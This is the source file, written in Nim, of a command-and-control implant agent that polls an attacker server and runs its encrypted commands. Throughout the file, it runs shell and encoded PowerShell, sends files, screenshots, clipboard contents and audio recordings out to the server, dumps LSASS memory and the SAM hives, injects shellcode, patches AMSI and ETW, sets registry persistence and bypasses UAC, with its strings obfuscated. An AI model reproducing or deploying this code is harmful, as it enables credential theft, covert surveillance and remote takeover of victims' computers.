include config
import utils/[audio, clipboard, clr, enc, helpers, memops, misc, screenshot]
import std/[strformat, tables, nativesockets, random, json, streams]
import winim/[lean, com]
import wAuto/[registry]
import system/[io]
import httpclient
import NimProtect
import strutils
import osproc
import crc32
import os

# Core functions
proc start(): void
proc parse_command(command: JsonNode): bool
proc post_data(command_type: string, data_dict: string): bool
proc nimbo_main*(): void 

# Command executors
proc collect_data(): bool
proc run_shell_command(shell_command: string): bool
proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_module=""): bool
proc exfil_file(file_path: string): bool
proc write_file(file_data_base64: string, file_path: string): bool
proc checksec(): bool
proc wrap_get_clipboard(): bool
proc wrap_get_screenshot(): bool
proc wrap_record_audio(record_time: int): bool
proc dump_lsass(dump_method: string): bool
proc dump_sam(): bool
proc wrap_inject_shellc(shellc_base64: string, pid: int): bool
proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool
proc wrap_unhook_ntdll(): bool
proc wrap_patch_func(command_name: string): bool
proc set_run_key(key_name: string, cmd: string): bool
proc set_spe(process_name: string, cmd: string): bool
proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool
proc msgbox(title: string, text: string): bool
proc speak(text: string): bool
proc change_sleep_time(timeframe: int,  jitter_percent: int): bool
proc kill_agent(): void

# Helpers
proc get_agent_id(): string
proc is_elevated(): string
proc calc_sleep_time(timeframe: int,  jitter_percent: int): int

# Globals
let c2_url = fmt"{c2_scheme}://{c2_address}:{c2_port}"
let client = newHttpClient(userAgent=get_agent_id())


#########################
### Command executors ###
#########################


proc collect_data(): bool =
    var is_success: bool
    var hostname: string
    var os_version: string
    var process: string
    var username: string
    var is_admin: string
    var is_elevated: string
    var ipv4_local: string
    var ipv4_public: string

    hostname = getHostname()
    try:
        os_version = execute_encoded_powershell(protectString("RwBlAHQALQBDAG8AbQBwAHUAdABlAHIASQBuAGYAbwAgAHwAIABzAGUAbABlAGMAdAAgAC0ARQB4AHAAYQBuAGQAUAByAG8AcABlAHIAdAB5ACAAVwBpAG4AZABvAHcAcwBQAHIAbwBkAHUAYwB0AE4AYQBtAGUA"))
    except:
        os_version = could_not_retrieve
    try:
        username = execute_encoded_powershell(protectString("WwBTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBJAGQAZQBuAHQAaQB0AHkAXQA6ADoARwBlAHQAQwB1AHIAcgBlAG4AdAAoACkALgBuAGEAbQBlAAoA"))
    except:
        username = could_not_retrieve
    try:
        is_admin = execute_encoded_powershell(protectString("KABHAGUAdAAtAEwAbwBjAGEAbABHAHIAbwB1AHAATQBlAG0AYgBlAHIAIAAtAE4AYQBtAGUAIABBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARQB4AHAAYQBuAGQAUAByAG8AcABlAHIAdAB5ACAAbgBhAG0AZQApACAALQBjAG8AbgB0AGEAaQBuAHMAIABbAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEkAZABlAG4AdABpAHQAeQBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0ACgAKQAuAG4AYQBtAGUA"))
    except:
        is_admin = could_not_retrieve
    try:
        is_elevated = is_elevated()
    except:
        is_elevated = could_not_retrieve
    try: 
        ipv4_local = execute_encoded_powershell(protectString("RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAFcAaQBuADMAMgBfAE4AZQB0AHcAbwByAGsAQQBkAGEAcAB0AGUAcgBDAG8AbgBmAGkAZwB1AHIAYQB0AGkAbwBuACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIAAtAEUAeABwAGEAbgBkAFAAcgBvAHAAZQByAHQAeQAgAEkAUABBAGQAZAByAGUAcwBzACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAoACQAXwAgAC0AbABpAGsAZQAgACIAMQAwAC4AKgAuACoALgAqACIAKQAgAC0AbwByACAAKAAkAF8AIAAtAGwAaQBrAGUAIAAiADEAOQAyAC4AMQA2ADgALgAqAC4AKgAiACkAIAAtAG8AcgAgACgAJABfACAALQBsAGkAawBlACAAIgAxADcAMgAuADEANgA4AC4AKgAuACoAIgApAH0A"))
    except: 
        ipv4_local = could_not_retrieve
    try:
        ipv4_public = client.getContent(protectString("http://api.ipify.org"))
    except:
        ipv4_public = could_not_retrieve
    try:
        process = execute_encoded_powershell(protectString("JAB4ACAAPQAgAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAC0AUABJAEQAIAAkAHAAaQBkACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIAAtAEUAeABwAGEAbgBkAFAAcgBvAHAAZQByAHQAeQAgAG4AYQBtAGUAOwAgACIAJABwAGkAZAAgACQAeAAuAGUAeABlACIA"))
    except:
        process = could_not_retrieve

    var data = {

        protectString("Hostname"): hostname,
        protectString("OS Version"): os_version,
        protectString("Process"): process,
        protectString("Username"): username, 
        protectString("Is Admin"): is_admin, 
        protectString("Is Elevated"): is_elevated, 
        protectString("IPV4 Local"): ipv4_local, 
        protectString("IPV4 Public"): ipv4_public
    
    }.toOrderedTable()
    
    is_success = post_data(protectString("collect") , $data)

    return is_success


proc run_shell_command(shell_command: string): bool =
    var output: string
    var is_success: bool

    try:
        # output = execCmdEx(shell_command)[0]
        output = execCmdEx(shell_command, options={poDaemon})[0]

    except:
        output = could_not_retrieve
    
    var data = {
        protectString("shell_command"): shell_command,
        "output": output
    }.toOrderedTable()

    is_success = post_data(protectString("cmd"), $data)
    
    return is_success


proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_module=""): bool = 
    var output: string
    var is_success: bool
    # execute the powershell scriptblock
    try:
        output = execute_encoded_powershell(encoded_powershell_command)
    except:
        output = could_not_retrieve
    
    # command came from "iex" module
    if ps_module == "":
        var data = {
            protectString("powershell_command"): decode_64(encoded_powershell_command),
            "output": output
        }.toOrderedTable()
        is_success = post_data(protectString("iex"), $data)
    
    # command came from ps_module
    else:
        var data = {
            "output": output
        }.toOrderedTable()
        is_success = post_data(ps_module, $data)

    return is_success


proc exfil_file(file_path: string): bool = 
    var is_success: bool
    var file_content_base64: string

    try:
        file_content_base64 = encode_64(readFile(file_path), is_bin=true)
        is_success = true
    except:
        file_content_base64 = could_not_retrieve
        is_success = false
    
    var data = {
        "is_success": $is_success,
        "file_path": file_path,
        protectString("file_content_base64"): file_content_base64
    }.toOrderedTable()
    
    is_success = post_data(protectString("download") , $data)

    return is_success


proc write_file(file_data_base64: string, file_path: string): bool =
    var is_success: bool
    var f = newFileStream(file_path, fmWrite)
    
    if isNil(f):
        is_success = false
    else:
        var file_data = decode_64(file_data_base64, is_bin=true)
        f.write(file_data)
        f.close()
        is_success = true
    
    var data = {
        "is_success": $is_success,
        protectString("file_upload_path"): file_path,
    }.toOrderedTable()
    
    is_success = post_data(protectString("upload") , $data)

    return is_success


proc checksec(): bool =
    var products = ""
    var is_success: bool
    try:
        var wmi = GetObject(protectString("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\securitycenter2"))
        for i in wmi.execQuery(protectString("SELECT displayName FROM AntiVirusProduct")):
            products = products & "\n[+] " & $i.displayName
        is_success = true
    except:
        is_success = false
    
    var data = {
        "is_success": $is_success,
        "products": products
    }.toOrderedTable()
    
    is_success = post_data(protectString("checksec") , $data)

    return is_success


proc wrap_get_clipboard(): bool =
    var clipboard: string
    var is_success: bool
    try:
        clipboard = get_clipboard()
        is_success = true
    except:
        clipboard = could_not_retrieve
        is_success = false
    
    var data = {
        "is_success": $is_success,
        protectString("clipboard"): clipboard
    }.toOrderedTable()
    
    is_success = post_data(protectString("clipboard") , $data)

    return is_success


proc wrap_get_screenshot(): bool =
    var screenshot_stream: string
    var is_success: bool
    try:
        screenshot_stream = get_screenshot()
        is_success = true
    except:
        screenshot_stream = could_not_retrieve
        is_success = false
    
    var data = {
        "is_success": $is_success,
        protectString("screenshot_base64"): encode_64(screenshot_stream, is_bin=true)
    }.toOrderedTable()
    
    is_success = post_data(protectString("screenshot") , $data)

    return is_success


proc wrap_record_audio(record_time: int): bool = 
    var is_success: bool
    var file_content_base64: string
    var wav_file = "r.w"

    discard record_audio(wav_file, record_time)

    sleep(3000)

    try:
        file_content_base64 = encode_64(readFile(wav_file), is_bin=true)
        is_success = true
    except:
        file_content_base64 = could_not_retrieve
        is_success = false

    try:
        removeFile(wav_file)
    except:
        discard
    
    var data = {
        "is_success": $is_success,
        protectString("file_content_base64"): file_content_base64
    }.toOrderedTable
    is_success = post_data(protectString("audio") , $data)

    return is_success


proc dump_lsass(dump_method: string): bool = 
    var is_success: bool
    var file_content_base64: string

    case dump_method:
        of "direct":
            discard dump_lsass_minidumpwritedump()
        of "comsvcs":
            discard execute_encoded_powershell(protectString("cgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIABDADoAXAB3AGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAYwBvAG0AcwB2AGMAcwAuAGQAbABsACwAIABNAGkAbgBpAEQAdQBtAHAAIAAoAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAGwAcwBhAHMAcwB8ACAAcwBlAGwAZQBjAHQAIAAtAEUAeABwAGEAbgBkAFAAcgBvAHAAZQByAHQAeQAgAGkAZAApACAAbAAuAGQAIABmAHUAbABsAA=="))

    sleep(3000)

    try:
        file_content_base64 = encode_64(readFile("l.d"), is_bin=true)
        is_success = true
    except:
        file_content_base64 = could_not_retrieve
        is_success = false

    try:
        removeFile("l.d")
    except:
        discard
    
    var data = {
        "is_success": $is_success,
        protectString("file_content_base64"): file_content_base64
    }.toOrderedTable
    is_success = post_data(protectString("lsass") , $data)

    return is_success


proc dump_sam(): bool =
    var is_success: bool
    var sam_base64: string
    var sec_base64: string
    var sys_base64: string
    var sam_file = "s.am"
    var sec_file = "s.ec"
    var sys_file = "s.ys"

    if execCmdEx(protectString("reg.exe save hklm\\sam ") & sam_file, options={poDaemon}).exitCode == 0 and 
    execCmdEx(protectString("reg.exe save hklm\\security ") & sec_file, options={poDaemon}).exitCode == 0 and 
    execCmdEx(protectString("reg.exe save hklm\\system ") & sys_file, options={poDaemon}).exitCode == 0:
        is_success = true
    else:
        is_success = false

    sleep(3000)

    try:
        sam_base64 = encode_64(readFile(sam_file), is_bin=true)
        sec_base64 = encode_64(readFile(sec_file), is_bin=true)
        sys_base64 = encode_64(readFile(sys_file), is_bin=true)
        is_success = true
    except:
        sam_base64 = could_not_retrieve
        sec_base64 = could_not_retrieve
        sys_base64 = could_not_retrieve
        is_success = false

    try:
        removeFile(sam_file)
        removeFile(sec_file)
        removeFile(sys_file)
    except:
        discard
    
    var data = {
        "is_success": $is_success,
        protectString("sam_base64"): sam_base64,
        protectString("sec_base64"): sec_base64,
        protectString("sys_base64"): sys_base64
    }.toOrderedTable

    is_success = post_data(protectString("sam") , $data)


proc wrap_inject_shellc(shellc_base64: string, pid: int): bool =

    var shellc_bytes = to_bytes(decode_64(shellc_base64, is_bin=true))
    var is_success = inject_shellcode(shellc_bytes, pid)
    
    var data = {
        "is_success": $is_success,
        "pid": $pid
    }.toOrderedTable

    is_success = post_data(protectString("shellc") , $data)


proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool =
    var is_success: bool
    var output: string
    
    (is_success, output) = execute_assembly(assembly_base64, assembly_args)
    
    var data = {
        "is_success": $is_success,
        "output": output
    }.toOrderedTable()
    
    is_success = post_data(protectString("assembly"), $data)

    return is_success


proc wrap_unhook_ntdll(): bool =
    
    var is_success = unhook_ntdll()

    var data = {
        "is_success": $is_success
    }.toOrderedTable()
    
    is_success = post_data(protectString("unhook") , $data)

    return is_success


proc wrap_patch_func(command_name: string): bool =
    
    var is_success = patch_func(command_name)
    
    var data = {
        "is_success": $is_success
    }.toOrderedTable()
    
    is_success = post_data(command_name , $data)

    return is_success


proc set_run_key(key_name: string, cmd: string): bool =
    var is_success = false
    let run_path = protectString("\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
    var added_path = ""
    
    for hive in ["HKLM", "HKCU"]:
        if regWrite(hive & run_path, key_name, cmd):
            is_success = true  
            added_path = hive & run_path & " -> " & key_name
            break
    
    var data = {
        "is_success": $is_success,
        "registry_path": added_path,
        protectString("persistence_command"): cmd
    }.toOrderedTable()

    is_success = post_data(protectString("persist-run"), $data)
    
    return is_success


proc set_spe(process_name: string, cmd: string): bool =
    var is_success = false

    if regWrite(protectString("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\") & process_name, protectString("GlobalFlag"), 512) and 
    regWrite(protectString("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\") & process_name, protectString("ReportingMode"), 1) and 
    regWrite(protectString("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\") & process_name, protectString("MonitorProcess"), cmd):
        is_success = true
    
    var data = {
        "is_success": $is_success,
        protectString("triggering_process"): process_name,
        protectString("persistence_command"): cmd
    }.toOrderedTable()
    
    is_success = post_data(protectString("persist-spe"), $data)

    return is_success


proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool =
    var is_success = false
    var is_success_post: bool
    var reg_path: string
    var launch: string

    case bypass_method:
    of protectString("fodhelper"):
        reg_path = protectString("HKCU\\software\\classes\\ms-settings\\shell\\open\\command")
        launch = protectString("cmd /c fodhelper.exe")
    of protectString("sdclt"):
        reg_path = protectString("HKCU\\Software\\Classes\\Folder\\shell\\open\\command")
        launch = protectString("cmd /c sdclt.exe")
    else:
        return false
    
    if regWrite(reg_path, "", cmd) and regWrite(reg_path, protectString("DelegateExecute"), ""):
        sleep(2000)
        if execCmdEx(launch).exitCode == 0:
            is_success = true

    var data = {
        "is_success": $is_success,
        protectString("elevated_command"): cmd,
        "keep_or_die": keep_or_die
    }.toOrderedTable
    
    is_success_post = post_data(protectString("uac-") & bypass_method , $data)

    sleep(2000)
    regDelete(reg_path, "")
    regDelete(reg_path, protectString("DelegateExecute"))

    if is_success == true and keep_or_die == "die":
        ExitProcess(0)
    else:
        return is_success_post


proc msgbox(title: string, text: string): bool =
    var is_success: bool
    
    try:
        MessageBox(0, text, title, 0)
        is_success = true
    except:
        is_success = false
    
    var data = {
        "is_success": $is_success,
        "msgbox_content": "[" & title & "] " & text
        
    }.toOrderedTable()
    
    is_success = post_data("msgbox" , $data)
    return is_success


proc speak(text: string): bool =
    var is_success: bool
    
    try:
        var voice_obj = CreateObject(protectString("SAPI.SpVoice"))
        voice_obj.volume = 100
        voice_obj.speak(text)
        is_success = true
    except:
        is_success = false

    var data = {
        "is_success": $is_success,
        "text": text
    }.toOrderedTable()
    
    is_success = post_data(protectString("speak") , $data)
    return is_success


proc change_sleep_time(timeframe: int,  jitter_percent: int): bool =
    var is_success: bool
    call_home_timeframe = timeframe
    call_home_jitter_percent = jitter_percent
    
    var data = {
        protectString("sleep_timeframe"): $call_home_timeframe,
        protectString("sleep_jitter_percent"): $call_home_jitter_percent
    }.toOrderedTable()
    
    is_success = post_data(protectString("sleep") , $data)
    return is_success


proc kill_agent(): void =
    
    discard post_data(protectString("kill") , """{"Good bye": ":("}""")
    ExitProcess(0)


#########################
######## Helpers ########
#########################


proc get_agent_id(): string =
    var uuid: string
    var guid: string

    try:
        uuid = execute_encoded_powershell(protectString("KABHAGUAdAAtAEMAaQBtAEkAbgBzAHQAYQBuAGMAZQAgAC0AQwBsAGEAcwBzACAAVwBpAG4AMwAyAF8AQwBvAG0AcAB1AHQAZQByAFMAeQBzAHQAZQBtAFAAcgBvAGQAdQBjAHQAKQAuAFUAVQBJAEQA"))
    except:
        uuid = could_not_retrieve
    try:
        guid = execute_encoded_powershell(protectString("RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AcABhAHQAaAAgAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAQwByAHkAcAB0AG8AZwByAGEAcABoAHkAIAB8ACAAcwBlAGwAZQBjAHQAIAAtAEUAeABwAGEAbgBkAFAAcgBvAHAAZQByAHQAeQAgAE0AYQBjAGgAaQBuAGUARwB1AGkAZAA="))
    except:
        guid = could_not_retrieve
    var uaid = uuid & guid
    crc32(uaid)
    return uaid.toLower()


proc is_elevated(): string =
    return execute_encoded_powershell(protectString("KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMAUAByAGkAbgBjAGkAcABhAGwAKABbAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEkAZABlAG4AdABpAHQAeQBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0ACgAKQApACkALgBJAHMASQBuAFIAbwBsAGUAKAAiAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAiACkA"))


proc calc_sleep_time(timeframe: int,  jitter_percent: int): int =
    var jitter_range = ((jitter_percent * timeframe) / 100)
    var jitter_random = rand(((jitter_range / 2) * -1)..(jitter_range / 2))
    return (timeframe + int(jitter_random)) * 1000


##########################
##### Core functions #####
##########################


proc start(): void =
    sleep(sleep_on_execution * 1000)
    let binary_path = getAppFilename()
    if is_exe and (binary_path != agent_execution_path):
        var agent_execution_dir = splitFile(agent_execution_path)[0]
        createDir(agent_execution_dir)
        copyFile(binary_path, agent_execution_path)
        discard startProcess(agent_execution_path, options={poDaemon})
        ExitProcess(0)
    else:
        discard collect_data()


proc parse_command(command: JsonNode): bool =
    var is_success: bool
    var command_type = command[protectString("command_type")].getStr()

    case command_type:
        of protectString("cmd"):
            is_success = run_shell_command(command[protectString("shell_command")].getStr())
        of protectString("iex"):
            # direct iex
            if not contains(command, protectString("ps_module")):
                is_success = wrap_execute_encoded_powershell(command[protectString("encoded_powershell_command")].getStr())
            # ps_modules
            else:
                is_success = wrap_execute_encoded_powershell(command[protectString("encoded_powershell_command")].getStr(), command["ps_module"].getStr())
        of protectString("download"):
            is_success = exfil_file(command["src_file"].getStr())
        of protectString("upload"):
            is_success = write_file(command["src_file_data_base64"].getStr(), command["dst_file_path"].getStr())            
        of protectString("checksec"):
            is_success = checksec()
        of protectString("clipboard"):
            is_success = wrap_get_clipboard()
        of protectString("screenshot"):
            is_success = wrap_get_screenshot()
        of protectString("audio"):
            is_success = wrap_record_audio(command[protectString("record_time")].getInt())
        of protectString("lsass"):
            is_success = dump_lsass(command[protectString("dump_method")].getStr())
        of protectString("sam"):
            is_success = dump_sam()
        of protectString("shellc"):
            is_success = wrap_inject_shellc(command[protectString("shellc_base64")].getStr(), command["pid"].getInt())
        of protectString("assembly"):
            is_success = wrap_execute_assembly(command["assembly_base64"].getStr(), command["assembly_args"].getStr())
        of protectString("unhook"):
            is_success = wrap_unhook_ntdll()
        of protectString("amsi"), protectString("etw"):
            is_success = wrap_patch_func(command[protectString("command_type")].getStr())
        of protectString("persist-run"):
            is_success = set_run_key(command["key_name"].getStr(), command[protectString("persist_command")].getStr())
        of protectString("persist-spe"):
            is_success = set_spe(command[protectString("process_name")].getStr(), command[protectString("persist_command")].getStr())
        of protectString("uac-bypass"):
            is_success = uac_bypass(command[protectString("bypass_method")].getStr(), command[protectString("elevated_command")].getStr(), command[protectString("keep_or_die")].getStr())
        of protectString("msgbox"):
            is_success = msgbox(command["title"].getStr(), command["text"].getStr())
        of protectString("speak"):
            is_success = speak(command["text"].getStr())
        of protectString("sleep"):
            is_success = change_sleep_time(command["timeframe"].getInt(), command[protectString("jitter_percent")].getInt())
        of protectString("collect"):
            is_success = collect_data()
        of protectString("kill"):
            kill_agent()

        else:
            is_success = false
    return is_success
        

proc post_data(command_type: string, data_dict: string): bool =
    var data_to_send = """{"command_type": """" & command_type & """", "data": """ & data_dict & "}"
    try:
        discard client.post(c2_url, body=encrypt_cbc(data_to_send, communication_aes_key, communication_aes_iv))
        return true
    except:
        return false


proc nimbo_main*(): void =
    var res: Response
    var server_content: JsonNode
    var is_success: bool

    start()

    while true:
        try:
            res = client.get(c2_url)
        except:
            continue

        server_content =  parseJson(decrypt_cbc(res.body, communication_aes_key, communication_aes_iv))

        if len(server_content) == 0:
            sleep(calc_sleep_time(call_home_timeframe, call_home_jitter_percent))
            continue
        else:
            for command in server_content:
                try:
                    is_success = parse_command(command)
                except:
                    discard
